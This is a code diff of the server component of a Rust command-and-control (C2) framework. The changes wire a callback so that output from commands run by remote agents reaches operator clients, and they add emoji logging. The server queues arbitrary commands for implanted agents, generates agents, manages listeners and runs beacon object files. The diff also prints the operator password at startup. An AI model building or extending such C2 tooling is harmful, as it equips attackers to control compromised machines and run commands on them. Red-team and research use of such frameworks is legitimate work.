@@ -1,4 +1,4 @@
-// src/server.rs
+// src/server.rs - Complete working version with callback integration
 use std::sync::{Arc, Mutex};
 use std::net::SocketAddr;
 use std::collections::HashMap;
@@ -11,7 +11,7 @@ use serde::{Serialize, Deserialize};
 use clap::Parser;
 use log::{info, error, warn};
 
-// Import your existing modules (we need to access listeners, agents, etc.)
+// Import your existing modules
 mod listener;
 mod agent;
 mod bof;
@@ -19,7 +19,7 @@ mod crypto;
 mod models;
 mod utils;
 
-use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, TaskResult};
+use crate::listener::{Listener, ListenerConfig, get_all_agents, add_task_for_agent, set_result_callback};
 use agent::{AgentGenerator, AgentConfig};
 use bof::BofExecutor;
 use models::agent::Agent;
@@ -66,10 +66,10 @@ pub enum ServerMessage {
 }
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-struct ListenerInfo {
-    id: usize,
-    config: ListenerConfig,
-    running: bool,
+pub struct ListenerInfo {
+    pub id: usize,
+    pub config: ListenerConfig,
+    pub running: bool,
 }
 
 // Server state
@@ -161,16 +161,41 @@ async fn broadcast_updates(
     }
 }
 
-// Handle an individual client connection
+// 🎯 CRITICAL FUNCTION - Enhanced client handler with callback registration
 async fn handle_client(
     stream: TcpStream, 
     addr: SocketAddr,
     state: Arc<Mutex<ServerState>>,
 ) {
-    info!("New client connected: {}", addr);
+    info!("🔗 New client connected: {}", addr);
 
     // Create channels for communication
-    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(100);
+    let (client_tx, mut client_rx) = mpsc::channel::<ServerMessage>(1000);
+
+    // 🎯 CRITICAL FIX - Register callback to receive command results from listener
+    let client_tx_clone = client_tx.clone();
+    set_result_callback(move |agent_id, task_id, command, output, success| {
+        println!("📡 SERVER: Callback received result for agent {}", agent_id);
+        println!("   Task: {}", task_id);
+        println!("   Command: {}", command);
+        println!("   Success: {}", success);
+        println!("   Output length: {}", output.len());
+        
+        let msg = ServerMessage::CommandResult {
+            agent_id,
+            task_id,
+            command,
+            output,
+            success,
+        };
+        
+        // Send to client (use try_send to avoid blocking)
+        if let Err(e) = client_tx_clone.try_send(msg) {
+            println!("❌ SERVER: Failed to send result to client: {}", e);
+        } else {
+            println!("✅ SERVER: Successfully sent result to client");
+        }
+    });
 
     // Split the stream into read and write halves
     let (mut read_half, mut write_half) = stream.into_split();
@@ -178,7 +203,7 @@ async fn handle_client(
     let mut buffer = [0u8; 4096];
     let mut authenticated = false;
 
-    // Add a temporary entry for this client
+    // Add client to server state
     {
         let mut state = state.lock().unwrap();
         state.clients.insert(addr.to_string(), client_tx.clone());
@@ -202,7 +227,7 @@ async fn handle_client(
                 break;
             }
         }
-        info!("Client sender task ended for {}", addr_clone);
+        info!("📤 Client sender task ended for {}", addr_clone);
     });
 
     // Main client handling loop for receiving messages from the client
@@ -216,7 +241,7 @@ async fn handle_client(
 
         let len = u32::from_be_bytes(len_bytes) as usize;
         if len > buffer.len() {
-            error!("Message too large from client {}", addr);
+            error!("❌ Message too large from client {}", addr);
             break;
         }
 
@@ -230,7 +255,7 @@ async fn handle_client(
         let msg: ClientMessage = match bincode::deserialize(&buffer[0..len]) {
             Ok(msg) => msg,
             Err(e) => {
-                error!("Failed to deserialize message from {}: {}", addr, e);
+                error!("❌ Failed to deserialize message from {}: {}", addr, e);
                 continue;
             }
         };
@@ -242,9 +267,9 @@ async fn handle_client(
                     let state = state.lock().unwrap();
                     let success = password == state.password;
                     let message = if success { 
-                        "Authentication successful".to_string() 
+                        "✅ Authentication successful".to_string() 
                     } else { 
-                        "Invalid password".to_string() 
+                        "❌ Invalid password".to_string() 
                     };
                     
                     let listeners_update = if success {
@@ -269,7 +294,7 @@ async fn handle_client(
                 authenticated = success;
                 let auth_result = ServerMessage::AuthResult { success, message };
                 if let Err(e) = client_tx.send(auth_result).await {
-                    error!("Failed to send auth result to {}: {}", addr, e);
+                    error!("❌ Failed to send auth result to {}: {}", addr, e);
                     break;
                 }
                 
@@ -277,14 +302,14 @@ async fn handle_client(
                 if authenticated {
                     if let Some(listeners_update) = listeners_update {
                         if let Err(e) = client_tx.send(listeners_update).await {
-                            error!("Failed to send listeners update to {}: {}", addr, e);
+                            error!("❌ Failed to send listeners update to {}: {}", addr, e);
                             break;
                         }
                     }
                     
                     if let Some(agents_update) = agents_update {
                         if let Err(e) = client_tx.send(agents_update).await {
-                            error!("Failed to send agents update to {}: {}", addr, e);
+                            error!("❌ Failed to send agents update to {}: {}", addr, e);
                             break;
                         }
                     }
@@ -294,10 +319,10 @@ async fn handle_client(
             // All other messages require authentication
             _ if !authenticated => {
                 let error_msg = ServerMessage::Error { 
-                    message: "Not authenticated".to_string() 
+                    message: "❌ Not authenticated".to_string() 
                 };
                 if let Err(e) = client_tx.send(error_msg).await {
-                    error!("Failed to send error to {}: {}", addr, e);
+                    error!("❌ Failed to send error to {}: {}", addr, e);
                     break;
                 }
             },
@@ -314,15 +339,15 @@ async fn handle_client(
                 
                 let response = match result {
                     Ok(_) => ServerMessage::Success { 
-                        message: "Listener added successfully".to_string() 
+                        message: "✅ Listener added successfully".to_string() 
                     },
                     Err(e) => ServerMessage::Error { 
-                        message: format!("Failed to add listener: {}", e) 
+                        message: format!("❌ Failed to add listener: {}", e) 
                     },
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
                 
@@ -344,15 +369,15 @@ async fn handle_client(
                 
                 let response = match result {
                     Ok(_) => ServerMessage::Success { 
-                        message: format!("Listener {} started successfully", id) 
+                        message: format!("✅ Listener {} started successfully", id) 
                     },
                     Err(e) => ServerMessage::Error { 
-                        message: format!("Failed to start listener {}: {}", id, e) 
+                        message: format!("❌ Failed to start listener {}: {}", id, e) 
                     },
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
                 
@@ -374,15 +399,15 @@ async fn handle_client(
                 
                 let response = match result {
                     Ok(_) => ServerMessage::Success { 
-                        message: format!("Listener {} stopped successfully", id) 
+                        message: format!("✅ Listener {} stopped successfully", id) 
                     },
                     Err(e) => ServerMessage::Error { 
-                        message: format!("Failed to stop listener {}: {}", id, e) 
+                        message: format!("❌ Failed to stop listener {}: {}", id, e) 
                     },
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
                 
@@ -401,7 +426,7 @@ async fn handle_client(
                 };
                 
                 if let Err(e) = client_tx.send(listeners_update).await {
-                    error!("Failed to send listeners to {}: {}", addr, e);
+                    error!("❌ Failed to send listeners to {}: {}", addr, e);
                     break;
                 }
             },
@@ -414,15 +439,15 @@ async fn handle_client(
                 
                 let response = match result {
                     Ok(_) => ServerMessage::Success { 
-                        message: "Agent generated successfully".to_string() 
+                        message: "✅ Agent generated successfully".to_string() 
                     },
                     Err(e) => ServerMessage::Error { 
-                        message: format!("Failed to generate agent: {}", e) 
+                        message: format!("❌ Failed to generate agent: {}", e) 
                     },
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
             },
@@ -433,22 +458,28 @@ async fn handle_client(
                 };
                 
                 if let Err(e) = client_tx.send(agents_update).await {
-                    error!("Failed to send agents to {}: {}", addr, e);
+                    error!("❌ Failed to send agents to {}: {}", addr, e);
                     break;
                 }
             },
 
+            // 🎯 CRITICAL MESSAGE HANDLER - Execute command
             ClientMessage::ExecuteCommand { agent_id, command } => {
+                println!("🎯 SERVER: Execute command '{}' for agent '{}'", command, agent_id);
+                
                 let task_id = add_task_for_agent(&agent_id, command.clone());
+                println!("📋 SERVER: Created task {} for agent {}", task_id, agent_id);
                 
                 let response = ServerMessage::Success { 
-                    message: format!("Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
+                    message: format!("📤 Command '{}' queued for agent {} (Task: {})", command, agent_id, task_id)
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
+                
+                println!("✅ SERVER: Command queued successfully, waiting for agent execution and callback");
             },
 
             ClientMessage::ExecuteBof { bof_path, args, target } => {
@@ -459,15 +490,15 @@ async fn handle_client(
                 
                 let response = match result {
                     Ok(_) => ServerMessage::Success { 
-                        message: "BOF executed successfully".to_string() 
+                        message: "✅ BOF executed successfully".to_string() 
                     },
                     Err(e) => ServerMessage::Error { 
-                        message: format!("Failed to execute BOF: {}", e) 
+                        message: format!("❌ Failed to execute BOF: {}", e) 
                     },
                 };
                 
                 if let Err(e) = client_tx.send(response).await {
-                    error!("Failed to send response to {}: {}", addr, e);
+                    error!("❌ Failed to send response to {}: {}", addr, e);
                     break;
                 }
             },
@@ -481,7 +512,7 @@ async fn handle_client(
         state.clients.remove(&addr.to_string());
     }
 
-    info!("Client disconnected: {}", addr);
+    info!("🔌 Client disconnected: {}", addr);
 }
 
 // Generate a simple teamserver script
@@ -529,8 +560,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Generate teamserver script if it doesn't exist
     if !std::path::Path::new("teamserver").exists() {
         match generate_teamserver_script(&args.ip_address, args.port, &args.password) {
-            Ok(_) => info!("Generated teamserver script"),
-            Err(e) => warn!("Failed to generate teamserver script: {}", e),
+            Ok(_) => info!("✅ Generated teamserver script"),
+            Err(e) => warn!("⚠️ Failed to generate teamserver script: {}", e),
         }
     }
 
@@ -541,7 +572,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let addr = format!("{}:{}", args.ip_address, args.port).parse::<SocketAddr>()?;
     let listener = TcpListener::bind(&addr).await?;
 
-    info!("C2 Server listening on {}", addr);
+    info!("🚀 C2 Server listening on {}", addr);
+    println!("🔑 Password: {}", args.password);
+    println!("📡 Ready for client connections...");
+    println!("📋 Callback system ready for command results");
 
     // Accept connections
     loop {
@@ -553,7 +587,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 });
             }
             Err(e) => {
-                error!("Error accepting connection: {}", e);
+                error!("❌ Error accepting connection: {}", e);
             }
         }
     }
